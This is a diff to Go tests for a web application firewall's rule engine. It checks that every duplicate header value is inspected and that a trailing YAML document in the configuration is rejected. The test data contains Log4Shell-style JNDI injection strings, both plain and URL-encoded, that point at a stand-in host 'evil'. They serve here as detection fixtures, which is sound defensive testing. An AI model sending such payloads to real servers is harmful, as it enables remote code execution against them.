@@ -103,9 +103,23 @@ domains:
 
 	hdrs := map[string]string{"referer": "http://evil/%24%7Bjndi%3Aldap://x%7D"}
 	r := req("h.test", "192.0.2.9", "/page", "Mozilla")
-	r.Header = func(name string) string { return hdrs[name] }
+	r.Header = func(name string) []string {
+		if v, ok := hdrs[name]; ok {
+			return []string{v}
+		}
+		return nil
+	}
 	if d := gc.Evaluate(r); d.Action != ActionDeny || d.Reason != "waf:jndi-header" {
 		t.Errorf("encoded jndi referer: got %s/%s, want deny/waf:jndi-header", d.Action, d.Reason)
+	}
+
+	// Every occurrence is inspected; a benign first value must not hide a
+	// malicious duplicate supplied later in the request.
+	r.Header = func(string) []string {
+		return []string{"https://example.com/", "${jndi:ldap://evil/a}"}
+	}
+	if d := gc.Evaluate(r); d.Action != ActionDeny || d.Reason != "waf:jndi-header" {
+		t.Errorf("malicious duplicate header: got %s/%s, want deny/waf:jndi-header", d.Action, d.Reason)
 	}
 
 	// Same request without the header getter: header targets never match.
@@ -123,6 +137,12 @@ domains:
 	plain := mustGuestConfig(t, `domains: { p.test: { rules: [ { id: kw, keywords: [ x ] } ] } }`)
 	if plain.NeedsMethod() {
 		t.Error("NeedsMethod() = true for a rule set without method filters")
+	}
+}
+
+func TestGuestConfigRejectsTrailingYAMLDocument(t *testing.T) {
+	if _, err := ParseGuestConfig([]byte("defaults: {}\n---\ndefaults: {}\n")); err == nil {
+		t.Fatal("second YAML document must be rejected")
 	}
 }
 
